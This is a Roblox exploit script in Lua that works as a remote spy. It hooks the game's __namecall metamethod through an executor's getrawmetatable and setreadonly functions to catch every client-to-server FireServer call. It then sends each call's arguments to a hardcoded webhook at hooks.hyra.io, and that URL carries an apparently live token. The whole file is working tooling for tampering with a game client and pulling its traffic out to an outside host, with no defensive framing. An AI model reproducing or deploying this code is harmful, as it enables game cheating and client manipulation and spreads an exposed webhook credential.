local webhook = "https://hooks.hyra.io/api/webhooks/1489564311423815720/95RTxCNmEopgkqiRY1n_jH5hxMFuNqCS5OYxppId3UE_QxdJWgXuMPbVoubeVDhp-AT6"
local request_func = request or http_request or (http and http.request)

local mt = getrawmetatable(game)
local old = mt.__namecall
setreadonly(mt, false)

mt.__namecall = newcclosure(function(self, ...)
    local method = getnamecallmethod()
    local args = {...}
    
    -- "FireServer" ensures we only capture Client -> Server
    -- "not checkcaller()" ensures we only capture things the GAME does, 
    -- but if you want to capture your OWN exploit scripts, remove "not checkcaller()"
    if method == "FireServer" then 
        local remotePath = self:GetFullName()
        
        -- Format the arguments sent to the server
        local argData = ""
        for i, v in ipairs(args) do
            argData = argData .. string.format("[%d] = %s (%s)\n", i, tostring(v), typeof(v))
        end

        task.spawn(function()
            if request_func then
                request_func({
                    Url = webhook,
                    Method = "POST",
                    Headers = {["Content-Type"] = "application/json"},
                    Body = game:GetService("HttpService"):JSONEncode({
                        ["embeds"] = {{
                            ["title"] = "📤 Client-to-Server Request",
                            ["description"] = "**Remote:** `game." .. remotePath .. "`",
                            ["fields"] = {
                                {["name"] = "Data Sent", ["value"] = "```lua\n" .. (argData ~= "" and argData or "No Data") .. "
```"}
                            },
                            ["color"] = 3066993 -- Green for outgoing
                        }}
                    })
                })
            end
        end)
    end
    
    return old(self, ...)
end)

setreadonly(mt, true)
